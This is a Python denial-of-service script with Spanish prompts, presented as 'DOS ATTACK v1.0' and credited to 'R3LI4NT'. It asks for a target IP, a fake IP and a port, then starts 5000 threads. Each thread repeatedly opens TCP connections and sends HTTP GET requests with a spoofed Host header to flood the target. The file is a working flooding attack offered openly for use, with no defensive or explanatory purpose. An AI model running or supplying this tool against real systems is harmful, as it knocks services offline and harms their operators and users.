#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os 
import sys
import socket
import threading
import time
from colorama import Fore, Style

os.system("clear")
print(Style.BRIGHT + Fore.GREEN + "Comprobando gestor de paquetes pip3..." + Style.NORMAL + Fore.WHITE)
os.system("sudo apt-get install python3-pip")
os.system("clear")

CC = "\033[36;1m" # Cyan light
print(Style.BRIGHT + Fore.BLUE +"""


           ██████╗  ██████╗ ███████╗
           ██╔══██╗██╔═══██╗██╔════╝
           ██║  ██║██║   ██║███████╗
           ██║  ██║██║   ██║╚════██║
           ██████╔╝╚██████╔╝███████║
           ╚═════╝  ╚═════╝ ╚══════╝
                                                  
""") 
print(CC + "———————————————————————————————————————————————▶")
print(Style.BRIGHT + Fore.RED +"""

 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗  
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝  
███████║   ██║      ██║   ███████║██║     █████╔╝   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗  
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ v1.0                                                    
"""+ Style.NORMAL + Fore.WHITE)    

#####################################################################################################
print(Style.BRIGHT + Fore.GREEN +"Creator :"+ Style.NORMAL + Fore.GREEN +" ·R3LI4NT·")
print(Style.BRIGHT + Fore.GREEN +"Github  :" + Style.NORMAL + Fore.GREEN +"  https://github.com/R3LI4NT" + Fore.WHITE)
#####################################################################################################
print("")

ip = input(Fore.CYAN + "Insertar IP: " + Fore.WHITE)

time.sleep(1)
ip_falsa = input(Fore.CYAN + "Insertar una IP falsa: " + Fore.WHITE)

time.sleep(1)
puerto = input(Fore.CYAN +"Insertar Puerto: " + Fore.WHITE)

puerto = int(puerto)

num_ataques = 0

print(Style.BRIGHT + Fore.GREEN +"""

   _   _   _             _          
  /_\ | |_| |_ __ _  ___| | __      
 //_\\| __| __/ _` |/ __| |/ /      
/  _  \ |_| || (_| | (__|   < _ _ _ 
\_/ \_/\__|\__\__,_|\___|_|\_(_|_|_)
                                    

""" + Style.NORMAL + Fore.GREEN)

def attack():

    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, puerto))
        sock.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'),(ip, puerto))
        sock.sendto(("HOST: " + ip_falsa + "\r\n\r\n").encode('ascii'),(ip, puerto))
        
        global num_ataques
        num_ataques += 1
        solicitudes = num_ataques
        solicitudes = str(solicitudes)
        print(Style.NORMAL + Fore.GREEN + "Enviando solicitud ➤ "+ Style.BRIGHT + Fore.WHITE + solicitudes)
        
        sock.close()

for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()